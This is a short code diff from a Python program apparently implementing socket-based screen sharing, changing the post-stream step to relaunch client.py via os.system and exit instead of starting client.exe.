@@ -99,8 +99,10 @@ def screenshare(sock):
     t.start()
     time.sleep(15)
     sender.stop_stream()
-    source = os.getcwd() + "\\client.exe"
-    os.startfile(source)
+    sourcefile = os.getcwd() + "\\client.py"
+    os.system(sourcefile)
+    sys.exit()
+
 
 
 def website(sock):
